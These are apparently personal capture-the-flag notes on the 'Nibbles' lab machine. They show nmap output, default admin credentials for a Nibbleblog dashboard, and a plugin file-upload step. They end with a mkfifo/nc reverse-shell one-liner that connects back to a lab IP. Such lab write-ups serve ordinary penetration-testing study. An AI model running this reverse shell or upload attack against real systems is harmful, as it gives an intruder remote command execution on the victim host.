# 

```
Nmap 7.99 scan initiated Fri Jul 31 12:21:19 2026 as: /usr/lib/nmap/nmap --privileged -sV --script=http-enum -oN /home/zinon/Documents/obsidian-vult/Cybersec/CTFs/Nibbles.md -Pn -vvvv 10.129.200.170

```


Nmap scan report for 10.129.200.170
Host is up, received user-set (0.41s latency).
Scanned at 2026-07-31 12:21:19 +08 for 417s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
whatweb ip

```

- Found a /nibbleblog
- Google **nibbleblog vuln** on google and found file upload vuln

Was able to find the username and password for admin dashboard

```
usrname - admin
passwrd - nibbles
```

#### Upload the php payload to plugin

We know that there was vulnerbility in plugin based on the googling before 

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.89 9999 >/tmp/f
```